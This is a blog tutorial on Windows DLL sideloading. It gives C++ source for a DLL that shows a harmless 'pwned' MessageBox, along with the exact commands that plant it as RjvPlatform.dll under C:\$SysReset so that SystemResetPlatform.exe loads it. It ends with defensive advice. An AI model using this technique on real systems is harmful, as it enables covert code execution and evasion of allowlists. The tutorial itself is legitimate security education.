---
title: "How to evade program allowlists with Windows DLL sideloading"
date: 2023-06-21
---

Sometimes, when seeking opportunities to explore and gain unauthorized access, you don't have to go to extreme lengths to exploit a highly secure system. Instead, you can focus on breaking an implementation. This means that simple misconfigurations, overlooked elements, or unidentified vulnerabilities in the security measures can provide them with an entry point to cause harm.

Naturally, we also strive to disguise our activities and maintain a covert presence. One of the techniques we can employ is known as "Living off the Land," which involves leveraging the existing programs, utilities, and tools within a system or technology to accomplish their objectives.

While I was studying and learning more and more about malware development to understand the techniques used in these attacks, I stumbled uppon this tweet from Grzegorz Tworek (@0gtweet) demonstrating this simple DLL sideloading technique he found and I it was so simple that I decided to run it on my own and to take you with me to understand how it works and how to protect yourself against it!

---

### What is DLL Sideloading?

In the Windows world, a lot of the functionalities of the OS and applications are provided by the DLL binaries. DLL files are the Microsoft's interpretation of the shared library concept, so instead of shipping all libraries and dependencies for each application, libraries are stored in a shared location and loaded as needed.

When an executable needs to call a function from a DLL, it asks the OS to load it the library into memory by specifying the library name (without full path). The OS locates it and loads it into the process address space. There's a few different locations where these libraries can be found, so the OS will check each one in a specific order to find the requested file.

Now that you know what is a DLL, I'll cut directly into the fun part. So basically researchers found out that there is a way of exploiting this by adding a disguised DLL into one of these folders that the OS searches, making common applications ask the OS to load a malicious DLL into memory unintentionally. One of the simplest ways of exploiting it is by taking advantage of the order of the folders that the OS searches, as it gets the first one that it finds.

There's two types of attacks, the passive and active exploitation. The main difference between passive and active exploitation lies on the binary that is utilized to explore the DLL sideloading technique. Active exploitation relies on binaries that are pre-installed in the system and is often used for detection evasion, as it executes the payload under the user credentials, while passive exploitation involves the usage of binaries that are not pre-installed in the system, and it can lead to privilege escalation (e.g. using a serviec running under SYSTEM to execute your code with system privileges) and be used to establish persistence.

This example we are going to take a active exploitation, as the binary we are going to use to exploit this DLL sideloading is already a pre-installed binary on the system.

This article by [Martin Zugec](https://www.linkedin.com/in/martin-zugec/), from [Bitdefender](https://www.bitdefender.com/), explains in details the types of DLL sideloading and the OS logic behind this. I definetely recommend you checking it out!

## Hacking!

This DLL sideloading demonstrated by Grzegorz takes advantage of the search order loading technique, where the OS will search in multiple folders in a specific order for the requested DLL and load the first one it finds.

So, by placing a malicious DLL with a specific name inside a user-writable location that is a early searched folder, we can make the OS believe that our DLL is the right one to load into memory.

### Creating a DLL

To test this technique first we are going to create a simple and safe DLL with our custom code to open a simple MessageBox.

There's many ways of creating a DLL with or without Visual Studio, but for this example I will use Visual Studio because that's whay I have handy. Microsoft has a tutorial on it, but I'll simplify the steps I took so you don't need to read all that stuff.

Within Visual Studio, follow these steps:

1 - Create a new Empty C++ project:

![Create a new Empty C++ project](/assets/images/dll-sideloading-visual-studio-project.png)

2 - Change the project Configuration type to Dynami Library (.dll)

![Change the project Configuration type to Dynami Library (.dll)](/assets/images/dll-sideloading-config-type.png)

3 - Create a new Source file (with any name you want + .cpp) and add this code:

![DLL Source Code](/assets/images/dll-sideloading-code-1.png)

```cpp
#include <windows.h>

BOOL WINAPI DllMain(HINSTANCE hModule, DWORD Reason, LPVOID lpvReserved) {
	switch (Reason) {
		case DLL_PROCESS_ATTACH:
			MessageBoxW(NULL, L"pwned", L"lol", MB_ICONINFORMATION | MB_OK);
			break;
	}
	return TRUE;

}
```

![DLL Source Code in Visual Studio](/assets/images/dll-sideloading-code-2.png)

Feel free to change the line inside the DLL_PROCESS_ATTACH case to whatever you want to execute when the DLL is loaded.

4 - Build it and we are done!

Your .dll file will be in /x64/Debug/ folder inside the project directory.

### Exploiting

The process to exploit this DLL Sideloading is really simple. As you can already see in the tweet sharing this technique, we need only three steps to test it.

Open your CMD and follow along.

1 - Create a stack folder inside the $SysReset framework directory

```batch
$ md C:\$SysReset\Framework\Stack
```

![Creating the stack folder](/assets/images/dll-sideloading-exploit-1.png)

2 - Copy your malicious DLL to the created folder with the name RjvPlatform.dll

```batch
$ copy malicious_payload.dll C:\$SysReset\Framework\Stack\RjvPlatform.dll
```

![Copying the DLL](/assets/images/dll-sideloading-exploit-2.png)

3 - Execute the SystemResetPlatform.exe binary.

```batch
$ C:\Windows\System32\SystemResetPlatform\SystemResetPlatform.exe
```

![Executing SystemResetPlatform.exe](/assets/images/dll-sideloading-exploit-3.png)

And with that you'll get your MessageBox opened!

![MessageBox showing pwned](/assets/images/dll-sideloading-exploit-4.png)

![Process Hacker showing DLL loaded](/assets/images/dll-sideloading-exploit-5.png)

This code that we were able to run will run with all the permissions granted to SystemResetPlatform during its execution.

You can even see the DLL loaded into the process modules by using a process explorer like Process Hacker and our little "pwned" string in memory.

### How to protect yourself?

There are many ways to protect yourself with cutting edge solutions and by putting principles and security measures into practice, like enforcing the least priviledge principle and by keeping everything up to date and using AVs that could detect the malicious code in file or in execution time, BUT, not only that can protect yourself.

What Grzegorz himself mentions in his tweet and that I also can enforce is how important DLL whitelist can be to protect your system and how often it is left behind as a phase 2 and actually never implemented. This step is necessary, and along with other security measures like DLL Signature Verification and monitoring new DLL files on the system that are not installed as part of a software update could provide a high-fidelity alert to catch attacks with DLLs early on.

### More about it

06/15/2023 - John Hammond did a video on this exact technique.

For a better explanation than mine and a live show case you may want to take a look on his approach on this issue in the video below!

### Disclaimer

The information you gather from this page, all the techniques, proofs-of-concept code, or whatever, are strictly for educational purposes. I do not condone the usage of anything you might gather from this blog for malicious purposes. I've made this blog to consolidate my learning by teaching while I am learning.

Feel free to contact me if you have any question! Have a nice day!

